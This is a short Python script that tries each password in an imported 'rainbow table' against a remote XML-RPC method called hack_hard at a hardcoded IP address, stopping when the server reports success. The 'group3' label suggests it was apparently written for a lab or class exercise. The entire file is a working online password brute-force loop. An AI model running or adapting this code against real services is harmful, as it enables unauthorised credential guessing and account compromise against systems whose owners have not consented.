import xmlrpc.client
from rainbow import rainbowtable

# For each combination in the list
for key, value in rainbowtable.items():
    try:
        print("\nTrying " + key + ":" + value)
        # Create connection
        s = xmlrpc.client.ServerProxy('http://128.39.145.79:8080')
        #s = xmlrpc.client.ServerProxy('http://188.138.32.138:8000')
        # Run the hack_easy method in the connection, with the current
        # combination as password
        success = s.hack_hard(value, "whiterose, group3")
        if (success!='success'):
            print("Try again")
        else:
            print("Great success! The correct password was", value)
            break # End the loop, we found the correct password
    except Exception as e:
        print(e)
        print("An error occurred. Please check the connection")
        pass
